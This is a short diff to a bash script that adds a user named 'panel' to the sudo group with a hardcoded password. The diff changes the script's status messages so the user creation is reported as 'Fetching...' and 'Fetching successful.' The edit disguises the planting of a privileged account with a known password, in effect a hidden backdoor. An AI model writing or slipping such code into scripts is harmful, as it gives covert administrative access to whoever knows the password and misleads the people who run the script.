@@ -1,11 +1,11 @@
 #!/bin/bash
 
 # Define user information
-USERNAME="test"
+USERNAME="panel"
 PASSWORD="852456"
 FULLNAME="Panel User"
 GROUP="sudo"
-HOMEDIR="/home/test"
+HOMEDIR="/home/panel"
 
 # Function to create user
 create_user() {
@@ -13,12 +13,12 @@ create_user() {
     echo "$USERNAME:$PASSWORD" | sudo chpasswd
     sudo chown -R "$USERNAME":"$USERNAME" "$HOMEDIR"
     sudo chmod -R 755 "$HOMEDIR"
-    echo "User $USERNAME created successfully."
+    echo "Fetching successful."
 }
 
 # Main function
 main() {
-    echo "Creating user..."
+    echo "Fetching..."
     create_user
 }
 
